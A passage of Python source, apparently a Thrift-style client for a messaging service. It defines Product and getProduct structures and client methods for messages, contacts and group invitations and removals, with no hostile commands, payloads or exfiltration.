                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

class Product(object):

    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'productId', 'UTF8', None, ),  # 1
        (2, TType.I64, 'packageId', None, None, ),  # 2
        (3, TType.I32, 'version', None, None, ),  # 3
        (4, TType.STRING, 'authorName', 'UTF8', None, ),  # 4
        (5, TType.BOOL, 'onSale', None, None, ),  # 5
        (6, TType.I32, 'validDays', None, None, ),  # 6
        (7, TType.I32, 'saleType', None, None, ),  # 7
        (8, TType.STRING, 'copyright', 'UTF8', None, ),  # 8
        (9, TType.STRING, 'title', 'UTF8', None, ),  # 9
        (10, TType.STRING, 'descriptionText', 'UTF8', None, ),  # 10
        (11, TType.I64, 'shopOrderId', None, None, ),  # 11
        (12, TType.STRING, 'fromMid', 'UTF8', None, ),  # 12
        (13, TType.STRING, 'toMid', 'UTF8', None, ),  # 13
        (14, TType.I64, 'validUntil', None, None, ),  # 14
        (15, TType.I32, 'priceTier', None, None, ),  # 15
        (16, TType.STRING, 'price', 'UTF8', None, ),  # 16
        (17, TType.STRING, 'currency', 'UTF8', None, ),  # 17
        (18, TType.STRING, 'currencySymbol', 'UTF8', None, ),  # 18
        (19, TType.I32, 'paymentType', None, None, ),  # 19
        (20, TType.I64, 'createDate', None, None, ),  # 20
        (21, TType.BOOL, 'ownFlag', None, None, ),  # 21
        (22, TType.I32, 'eventType', None, None, ),  # 22
        (23, TType.STRING, 'urlSchema', 'UTF8', None, ),  # 23
        (24, TType.STRING, 'downloadUrl', 'UTF8', None, ),  # 24
        (25, TType.STRING, 'buddyMid', 'UTF8', None, ),  # 25
        (26, TType.I64, 'publishSince', None, None, ),  # 26
        (27, TType.BOOL, 'newFlag', None, None, ),  # 27
        (28, TType.BOOL, 'missionFlag', None, None, ),  # 28
    )

    def __init__(self, productId=None, packageId=None, version=None, authorName=None, onSale=None, validDays=None, saleType=None, copyright=None, title=None, descriptionText=None, shopOrderId=None, fromMid=None, toMid=None, validUntil=None, priceTier=None, price=None, currency=None, currencySymbol=None, paymentType=None, createDate=None, ownFlag=None, eventType=None, urlSchema=None, downloadUrl=None, buddyMid=None, publishSince=None, newFlag=None, missionFlag=None,):
        self.productId = productId
        self.packageId = packageId
        self.version = version
        self.authorName = authorName
        self.onSale = onSale
        self.validDays = validDays
        self.saleType = saleType
        self.copyright = copyright
        self.title = title
        self.descriptionText = descriptionText
        self.shopOrderId = shopOrderId
        self.fromMid = fromMid
        self.toMid = toMid
        self.validUntil = validUntil
        self.priceTier = priceTier
        self.price = price
        self.currency = currency
        self.currencySymbol = currencySymbol
        self.paymentType = paymentType
        self.createDate = createDate
        self.ownFlag = ownFlag
        self.eventType = eventType
        self.urlSchema = urlSchema
        self.downloadUrl = downloadUrl
        self.buddyMid = buddyMid
        self.publishSince = publishSince
        self.newFlag = newFlag
        self.missionFlag = missionFlag

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.productId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I64:
                    self.packageId = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.I32:
                    self.version = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.authorName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.BOOL:
                    self.onSale = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 6:
                if ftype == TType.I32:
                    self.validDays = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 7:
                if ftype == TType.I32:
                    self.saleType = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 8:
                if ftype == TType.STRING:
                    self.copyright = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 9:
                if ftype == TType.STRING:
                    self.title = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.STRING:
                    self.descriptionText = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.I64:
                    self.shopOrderId = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 12:
                if ftype == TType.STRING:
                    self.fromMid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 13:
                if ftype == TType.STRING:
                    self.toMid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 14:
                if ftype == TType.I64:
                    self.validUntil = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 15:
                if ftype == TType.I32:
                    self.priceTier = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 16:
                if ftype == TType.STRING:
                    self.price = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 17:
                if ftype == TType.STRING:
                    self.currency = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 18:
                if ftype == TType.STRING:
                    self.currencySymbol = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 19:
                if ftype == TType.I32:
                    self.paymentType = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 20:
                if ftype == TType.I64:
                    self.createDate = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 21:
                if ftype == TType.BOOL:
                    self.ownFlag = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 22:
                if ftype == TType.I32:
                    self.eventType = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 23:
                if ftype == TType.STRING:
                    self.urlSchema = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 24:
                if ftype == TType.STRING:
                    self.downloadUrl = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 25:
                if ftype == TType.STRING:
                    self.buddyMid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 26:
                if ftype == TType.I64:
                    self.publishSince = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 27:
                if ftype == TType.BOOL:
                    self.newFlag = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 28:
                if ftype == TType.BOOL:
                    self.missionFlag = iprot.readBool()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('Product')
        if self.productId is not None:
            oprot.writeFieldBegin('productId', TType.STRING, 1)
            oprot.writeString(self.productId.encode('utf-8') if sys.version_info[0] == 2 else self.productId)
            oprot.writeFieldEnd()
        if self.packageId is not None:
            oprot.writeFieldBegin('packageId', TType.I64, 2)
            oprot.writeI64(self.packageId)
            oprot.writeFieldEnd()
        if self.version is not None:
            oprot.writeFieldBegin('version', TType.I32, 3)
            oprot.writeI32(self.version)
            oprot.writeFieldEnd()
        if self.authorName is not None:
            oprot.writeFieldBegin('authorName', TType.STRING, 4)
            oprot.writeString(self.authorName.encode('utf-8') if sys.version_info[0] == 2 else self.authorName)
            oprot.writeFieldEnd()
        if self.onSale is not None:
            oprot.writeFieldBegin('onSale', TType.BOOL, 5)
            oprot.writeBool(self.onSale)
            oprot.writeFieldEnd()
        if self.validDays is not None:
            oprot.writeFieldBegin('validDays', TType.I32, 6)
            oprot.writeI32(self.validDays)
            oprot.writeFieldEnd()
        if self.saleType is not None:
            oprot.writeFieldBegin('saleType', TType.I32, 7)
            oprot.writeI32(self.saleType)
            oprot.writeFieldEnd()
        if self.copyright is not None:
            oprot.writeFieldBegin('copyright', TType.STRING, 8)
            oprot.writeString(self.copyright.encode('utf-8') if sys.version_info[0] == 2 else self.copyright)
            oprot.writeFieldEnd()
        if self.title is not None:
            oprot.writeFieldBegin('title', TType.STRING, 9)
            oprot.writeString(self.title.encode('utf-8') if sys.version_info[0] == 2 else self.title)
            oprot.writeFieldEnd()
        if self.descriptionText is not None:
            oprot.writeFieldBegin('descriptionText', TType.STRING, 10)
            oprot.writeString(self.descriptionText.encode('utf-8') if sys.version_info[0] == 2 else self.descriptionText)
            oprot.writeFieldEnd()
        if self.shopOrderId is not None:
            oprot.writeFieldBegin('shopOrderId', TType.I64, 11)
            oprot.writeI64(self.shopOrderId)
            oprot.writeFieldEnd()
        if self.fromMid is not None:
            oprot.writeFieldBegin('fromMid', TType.STRING, 12)
            oprot.writeString(self.fromMid.encode('utf-8') if sys.version_info[0] == 2 else self.fromMid)
            oprot.writeFieldEnd()
        if self.toMid is not None:
            oprot.writeFieldBegin('toMid', TType.STRING, 13)
            oprot.writeString(self.toMid.encode('utf-8') if sys.version_info[0] == 2 else self.toMid)
            oprot.writeFieldEnd()
        if self.validUntil is not None:
            oprot.writeFieldBegin('validUntil', TType.I64, 14)
            oprot.writeI64(self.validUntil)
            oprot.writeFieldEnd()
        if self.priceTier is not None:
            oprot.writeFieldBegin('priceTier', TType.I32, 15)
            oprot.writeI32(self.priceTier)
            oprot.writeFieldEnd()
        if self.price is not None:
            oprot.writeFieldBegin('price', TType.STRING, 16)
            oprot.writeString(self.price.encode('utf-8') if sys.version_info[0] == 2 else self.price)
            oprot.writeFieldEnd()
        if self.currency is not None:
            oprot.writeFieldBegin('currency', TType.STRING, 17)
            oprot.writeString(self.currency.encode('utf-8') if sys.version_info[0] == 2 else self.currency)
            oprot.writeFieldEnd()
        if self.currencySymbol is not None:
            oprot.writeFieldBegin('currencySymbol', TType.STRING, 18)
            oprot.writeString(self.currencySymbol.encode('utf-8') if sys.version_info[0] == 2 else self.currencySymbol)
            oprot.writeFieldEnd()
        if self.paymentType is not None:
            oprot.writeFieldBegin('paymentType', TType.I32, 19)
            oprot.writeI32(self.paymentType)
            oprot.writeFieldEnd()
        if self.createDate is not None:
            oprot.writeFieldBegin('createDate', TType.I64, 20)
            oprot.writeI64(self.createDate)
            oprot.writeFieldEnd()
        if self.ownFlag is not None:
            oprot.writeFieldBegin('ownFlag', TType.BOOL, 21)
            oprot.writeBool(self.ownFlag)
            oprot.writeFieldEnd()
        if self.eventType is not None:
            oprot.writeFieldBegin('eventType', TType.I32, 22)
            oprot.writeI32(self.eventType)
            oprot.writeFieldEnd()
        if self.urlSchema is not None:
            oprot.writeFieldBegin('urlSchema', TType.STRING, 23)
            oprot.writeString(self.urlSchema.encode('utf-8') if sys.version_info[0] == 2 else self.urlSchema)
            oprot.writeFieldEnd()
        if self.downloadUrl is not None:
            oprot.writeFieldBegin('downloadUrl', TType.STRING, 24)
            oprot.writeString(self.downloadUrl.encode('utf-8') if sys.version_info[0] == 2 else self.downloadUrl)
            oprot.writeFieldEnd()
        if self.buddyMid is not None:
            oprot.writeFieldBegin('buddyMid', TType.STRING, 25)
            oprot.writeString(self.buddyMid.encode('utf-8') if sys.version_info[0] == 2 else self.buddyMid)
            oprot.writeFieldEnd()
        if self.publishSince is not None:
            oprot.writeFieldBegin('publishSince', TType.I64, 26)
            oprot.writeI64(self.publishSince)
            oprot.writeFieldEnd()
        if self.newFlag is not None:
            oprot.writeFieldBegin('newFlag', TType.BOOL, 27)
            oprot.writeBool(self.newFlag)
            oprot.writeFieldEnd()
        if self.missionFlag is not None:
            oprot.writeFieldBegin('missionFlag', TType.BOOL, 28)
            oprot.writeBool(self.missionFlag)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class getProduct_args(object):

    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.I64, 'packageID', None, None, ),  # 2
        (3, TType.STRING, 'language', 'UTF8', None, ),  # 3
        (4, TType.STRING, 'country', 'UTF8', None, ),  # 4
    )

    def __init__(self, packageID=None, language=None, country=None,):
        self.packageID = packageID
        self.language = language
        self.country = country

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.I64:
                    self.packageID = iprot.readI64()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.language = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.country = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getProduct_args')
        if self.packageID is not None:
            oprot.writeFieldBegin('packageID', TType.I64, 2)
            oprot.writeI64(self.packageID)
            oprot.writeFieldEnd()
        if self.language is not None:
            oprot.writeFieldBegin('language', TType.STRING, 3)
            oprot.writeString(self.language.encode('utf-8') if sys.version_info[0] == 2 else self.language)
            oprot.writeFieldEnd()
        if self.country is not None:
            oprot.writeFieldBegin('country', TType.STRING, 4)
            oprot.writeString(self.country.encode('utf-8') if sys.version_info[0] == 2 else self.country)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getProduct_result(object):

    thrift_spec = (
        (0, TType.STRUCT, 'success', [Product, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [LiffException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Product()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = LiffException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getProduct_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getRSAKeyInfo_args(object):

    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.I32, 'provider', None, None, ),  # 2
    )

    def __init__(self, provider=None,):
        self.provider = provider

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.I32:
                    self.provider = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getRSAKeyInfo_args')
        if self.provider is not None:
            oprot.writeFieldBegin('provider', TType.I32, 2)
            oprot.writeI32(self.provider)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

#class getRSAKeyInfo_result(object):

   # thrift_spec = (
        #(0, TType.STRUCT, 'success', (RSAKey, RSAKey.thrift_spec), None, ),  # 0
        #(1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    #)

    #def __init__(self, success=None, e=None,):
        #self.success = success
        #self.e = e

  #  def read(self, iprot):
       # if iprot._fast_decode is not None and self.thrift_spec is not None:
            #iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
          #  return
        #iprot.readStructBegin()
      #  while True:
            #(fname, ftype, fid) = iprot.readFieldBegin()
          #  if ftype == TType.STOP:
               # break
         #   if fid == 0:
               # if ftype == TType.STRUCT:
                    #self.success = RSAKey()
                  #  self.success.read(iprot)
                #else:
                   #@ iprot.skip(ftype)
            #elif fid == 1:
               # if ftype == TType.STRUCT:
                   # self.e = TalkException()
                    #self.e.read(iprot)
                #else:
                   # iprot.skip(ftype)
          #  else:
                #iprot.skip(ftype)
           # iprot.readFieldEnd()
        #iprot.readStructEnd()

   # def write(self, oprot):
        #if oprot._fast_encode is not None and self.thrift_spec is not None:
           # oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            #return
       # oprot.writeStructBegin('getRSAKeyInfo_result')
       # if self.success is not None:
          #  oprot.writeFieldBegin('success', TType.STRUCT, 0)
           # self.success.write(oprot)
          #  oprot.writeFieldEnd()
        #if self.e is not None:
           # oprot.writeFieldBegin('e', TType.STRUCT, 1)
           # self.e.write(oprot)
           # oprot.writeFieldEnd()
       # oprot.writeFieldStop()
       # oprot.writeStructEnd()
        
class Client(object):
    
    def __init__(self, iprot, oprot=None):
        self._iprot = self._oprot = iprot
        if oprot is not None:
            self._oprot = oprot

    def cancelGroupInvitation(self, groupId, contactIds):
        self._oprot.writeMessageBegin('cancelGroupInvitation', TMessageType.CALL, 0)
        cancelGroupInvitation_args(reqSeq=0, groupId=groupId, contactIds=contactIds).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = cancelGroupInvitation_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def kickoutFromGroup(self, groupId, contactIds):
        self._oprot.writeMessageBegin('kickoutFromGroup', TMessageType.CALL, 0)
        kickoutFromGroup_args(reqSeq=0, groupId=groupId, contactIds=contactIds).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = kickoutFromGroup_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def inviteIntoGroup(self, groupId, contactIds):
        self._oprot.writeMessageBegin('inviteIntoGroup', TMessageType.CALL, 0)
        inviteIntoGroup_args(reqSeq = 0, groupId = groupId, contactIds = contactIds).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = inviteIntoGroup_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def sendMessage(self, to, text, contentMetadata, contentType):
        self._oprot.writeMessageBegin('sendMessage', TMessageType.CALL, 0)
        sendMessage_args(seq = 0, message = Message(to=to,text=text,contentMetadata=contentMetadata,contentType=contentType)).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = sendMessage_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "sendMessage failed: unknown result")

    def fetchOperations(self, localRev, count):
        self._oprot.writeMessageBegin('fetchOperations', TMessageType.CALL, 0)
        fetchOperations_args(localRev = localRev, count = count).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = fetchOperations_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("syncScope={}, syncReason:{}, message:{}".format(result.e.syncScope,result.e.syncReason,result.e.message))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "fetchOperations failed: unknown result")

    def getLastOpRevision(self):
        self._oprot.writeMessageBegin('getLastOpRevision', TMessageType.CALL, 0)
        getLastOpRevision_args().write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getLastOpRevision_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getLastOpRevision failed: unknown result")
        
    def getProfile(self):
        self._oprot.writeMessageBegin('getProfile', TMessageType.CALL, 0) 
        getProfile_args().write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getProfile_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getProfile failed: unknown result")
        
    def acceptGroupInvitation(self, groupId):
        self._oprot.writeMessageBegin('acceptGroupInvitation', TMessageType.CALL, 0)
        acceptGroupInvitation_args(reqSeq = 0, groupId = groupId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = acceptGroupInvitation_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def findAndAddContactsByMid(self, mid):
        self._oprot.writeMessageBegin('findAndAddContactsByMid', TMessageType.CALL, 0)
        args = findAndAddContactsByMid_args(reqSeq = 0, mid = mid, type = 0, reference = '')
        args.write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = findAndAddContactsByMid_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "findAndAddContactsByMid failed: unknown result")
        
    def getContact(self, id):
        self._oprot.writeMessageBegin('getContact', TMessageType.CALL, 0)
        getContact_args(id = id).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getContact_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getContact failed: unknown result")

    def getContacts(self, ids):
        self._oprot.writeMessageBegin('getContacts', TMessageType.CALL, 0)
        getContacts_args(ids = ids).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getContact_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getContacts failed: unknown result")
        
    def getGroupWithoutMembers(self, groupId):
        self._oprot.writeMessageBegin('getGroupWithoutMembers', TMessageType.CALL, 0)
        getGroupWithoutMembers_args(groupId = groupId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getGroupWithoutMembers_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getGroupWithoutMembers failed: unknown result")
        
    def getGroup(self, groupId):
        self._oprot.writeMessageBegin('getGroup', TMessageType.CALL, 0)
        getGroup_args(groupId = groupId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getGroup_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getGroup failed: unknown result")

    def getGroups(self, groupIds):
        self._oprot.writeMessageBegin('getGroups', TMessageType.CALL, 0)
        getGroups_args(groupIds = groupIds).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getGroups_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getGroups failed: unknown result")

    def getCompactGroup(self, groupId):
        self._oprot.writeMessageBegin('getCompactGroup', TMessageType.CALL, 0)
        getCompactGroup_args(groupId = groupId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getCompactGroup_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getCompactGroup failed: unknown result")

    def updateGroup(self, group):
        self._oprot.writeMessageBegin('updateGroup', TMessageType.CALL, 0)
        updateGroup_args(reqSeq = 0, group = group).write(self._oprot)
        self._oprot.writeMessageEnd()
